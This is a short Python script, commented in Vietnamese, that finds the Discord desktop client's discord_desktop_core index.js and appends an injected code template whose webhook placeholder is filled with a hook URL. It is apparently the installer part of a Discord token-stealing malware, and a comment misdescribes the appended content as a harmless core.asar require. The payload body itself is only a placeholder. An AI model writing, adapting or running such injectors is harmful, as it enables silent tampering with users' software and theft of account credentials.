import os

def find_and_modify_index_js():
    # Đường dẫn thư mục %APPDATA%\Local\Discord\
    discord_path = os.getenv('LOCALAPPDATA') + '\\Discord'

    # Tìm các thư mục con có tên bắt đầu bằng "app-"
    for subdir in os.listdir(discord_path):
        if subdir.startswith('app-'):
            # Xây dựng đường dẫn đầy đủ đến thư mục modules
            modules_path = os.path.join(discord_path, subdir, 'modules')

            # Tìm tệp index.js trong thư mục discord_desktop_core-<core-version>\discord_desktop_core\
            for root, dirs, files in os.walk(modules_path):
                for file in files:
                    if file == 'index.js':
                        index_js_path = os.path.join(root, file)
                        # Ghi module.exports = require("./core.asar"); vào tệp index.js

                        with open(index_js_path, 'a') as f:
                            injection_code = "%code%".replace("%WEBHOOK%", "%hookurl%")
                            f.write(injection_code)
                        print(f'Successfully modified {index_js_path}')
                        return

    print('index.js not found')

# Gọi hàm để thực hiện tìm và sửa tệp index.js
find_and_modify_index_js()
